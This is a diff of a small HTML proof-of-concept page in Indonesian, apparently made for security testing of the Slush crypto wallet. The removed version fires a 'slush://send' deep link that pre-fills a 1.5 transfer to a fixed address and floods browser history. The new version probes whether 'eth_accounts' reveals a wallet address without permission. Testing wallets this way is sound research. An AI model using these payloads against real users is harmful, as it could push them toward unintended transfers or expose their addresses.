@@ -1,40 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>PoC Simple | Slush Wallet</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>PoC | Account Visibility Leak</title>
     <style>
-        body { background: #000; color: #ff0055; font-family: sans-serif; text-align: center; padding: 50px; }
-        .box { border: 2px solid #ff0055; padding: 20px; border-radius: 10px; display: inline-block; }
-        button { background: #ff0055; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { background: #0d1117; color: #58a6ff; font-family: monospace; padding: 30px; text-align: center; }
+        .audit-box { border: 1px solid #30363d; padding: 20px; border-radius: 10px; background: #161b22; display: inline-block; width: 100%; max-width: 400px; }
+        .status-low { color: #8b949e; font-size: 12px; margin-bottom: 20px; }
+        #address-display { color: #ff7b72; word-break: break-all; margin-top: 15px; font-weight: bold; border: 1px dashed #444; padding: 10px; }
+        .btn-check { background: #238636; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>CRITICAL TEST</h2>
-    <p style="color: #888;">Klik untuk tes Auto-fill & Bridge Stress</p>
-    <button onclick="runExploit()">JALANKAN POC</button>
-    <div id="status" style="margin-top: 15px; font-size: 12px; color: #00ff00;"></div>
+<div class="audit-box">
+    <h3>Account Visibility PoC</h3>
+    <p class="status-low">Menguji apakah alamat dompet bocor otomatis tanpa izin "Connect".</p>
+    
+    <button class="btn-check" onclick="checkVisibility()">Check Account Access</button>
+    
+    <div id="address-display">Status: Menunggu interaksi...</div>
 </div>
 
 <script>
-    function runExploit() {
-        const out = document.getElementById('status');
-        
-    
-        const targetUri = "slush://send?to=0x742d35Cc6634C0532925a3b844Bc454e4438f44e&amount=1.5";
-        window.location.href = targetUri;
-        out.innerText = "Triggering: " + targetUri;
+    async function checkVisibility() {
+        const display = document.getElementById('address-display');
+        display.innerText = "Mencoba memanggil eth_accounts...";
 
-      
-        for (let i = 0; i < 500; i++) {
-            history.pushState(null, "", "#stress_" + i);
+        if (window.ethereum) {
+            try {
+             
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                
+                if (accounts.length > 0) {
+                    display.innerHTML = "VULNERABILITY DETECTED!<br>Alamat Bocor: " + accounts[0];
+                    console.log("Terdeteksi akun:", accounts[0]);
+                } else {
+                    display.innerText = "Aman: Akun tidak terlihat sebelum diizinkan.";
+                }
+            } catch (error) {
+                display.innerText = "Error: " + error.message;
+            }
+        } else {
+            
+            display.innerText = "Mencoba via Deep Link Bridge...";
+            window.location.href = "slush://request?method=eth_accounts";
         }
-        
-        setTimeout(() => {
-            alert("Cek Dompet: Jika terbuka dengan alamat & jumlah terisi, lapor sebagai CRITICAL.");
-        }, 1000);
     }
 </script>
 
